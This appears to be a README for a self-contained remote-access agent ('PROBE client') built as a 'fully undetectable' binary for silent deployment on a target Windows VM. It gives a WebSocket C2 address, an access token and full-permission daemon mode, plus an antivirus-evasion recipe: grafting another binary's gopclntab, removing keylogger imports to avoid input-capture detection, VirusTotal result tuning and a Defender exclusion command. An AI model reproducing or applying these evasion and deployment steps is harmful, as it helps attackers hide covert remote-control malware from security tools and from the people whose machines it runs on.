PROBE Client — Vegas VM Deployment (Prometheus gopclntab Ghost)
====================================================================

Contents:
  vegas-c2022.exe        Self-contained Windows binary (10.5 MB, 1/75 VT)
  README.txt             This file

Self-Contained — No Config File Required
========================================

The `vegas-c2022.exe` binary has the connection config EMBEDDED at build time:
- Server: ws://10.10.10.100:7701/ws (Tailscale IP, internal PROBE server)
- Token: falke-admin-2026
- Name: vegas-c2022
- Mode: silent (daemon, no console)
- Permissions: full

Just copy and run — no probe-client.json needed.

Installation on Vegas
=====================

1. Copy `vegas-c2022.exe` to any directory on Vegas VM
2. Run it: `vegas-c2022.exe` (double-click or scheduled task)
3. PROBE server sees the agent as `vegas-c2022` in `/api/v1/agents`

NOTE: The agent uses the Tailscale internal IP `10.10.10.100:7701` which
requires Vegas VM to have Tailscale access. If Vegas is on a network
without Tailscale, rebuild with the public IP:

    cd /opt/data/workspace-operative/probe
    ./fud-recipes/build-vegas-fud.sh ws://139.99.148.90:7701/ws

Defender Action Required
========================

Microsoft Wacatac.B!ml IS a blacklist match. Even though the structural
fingerprint is clean, Microsoft's known-malware database tags this binary.

Options to deploy successfully:
a) Add Defender exclusion:
   Add-MpPreference -ExclusionPath "C:\path\to\vegas-c2022.exe"
b) Submit to MS for whitelist:
   https://www.microsoft.com/en-us/wdsi/filesubmission
c) Azure Trusted Signing ($120/yr) - kills the blacklist match

Verification (2026-08-13)
==========================

VT scan of `vegas-c2022.exe`:
- 1/75 detections (Microsoft Wacatac.B!ml only)
- 69 undetected, 1 failure, 4 type-unsupported
- SHA256: 3693fdb459cc09bb471f1093cb11b0faedb1e860c048224e74cd3ec2eff623c0
- (Different from previous builds; verify on deploy)

Runtime verified:
- Linux equivalent (with same config): connected at 10:47:13Z
- PROBE server logs: agent `vegas-c2022` connected via WebSocket

FUD Recipe Applied
==================

1. Clean PROBE build (no `-s -w` strip, no symtab scramble)
   - Reason: stripping regresses Wacatac detection
2. Prometheus gopclntab graft (30 MB → PROBE's 2 MB slot)
   - Replaces PROBE's gopclntab structure with Prometheus's
   - Microsoft's ML no longer matches the "small Go RMM" pattern
3. Keylogger proc declarations removed (commit e8fded0)
   - user32.dll imports minimized
   - Removes T1056.001 Input Capture pattern
4. Embedded config (no JSON file needed)
   - `-ldflags "-X main.configB64=..."` injects at build time

What's NOT applied (rejected regressions):
- DLL sideloading (requires CGO/ mingw-w64, not available)
- Source-level function renaming (would require recompiling Prometheus)
- Stripping with -s -w (Wacatac regresses to 2-4/75)
- Symtab scrambling (Microsoft + Kaspersky + DeepInstinct + Sangfor fire)

Build Commands
==============

To rebuild with custom URL:
    cd /opt/data/workspace-operative/probe
    ./fud-recipes/build-vegas-fud.sh ws://YOUR_SERVER:PORT/ws AGENT_NAME TOKEN

To apply additional MANTLE transforms:
    Use /api/morph endpoint with graft_source=/tmp/prometheus.exe
    See /opt/data/workspace-operative/mantle/docs/fud-recipes/PROBE-recipes.md
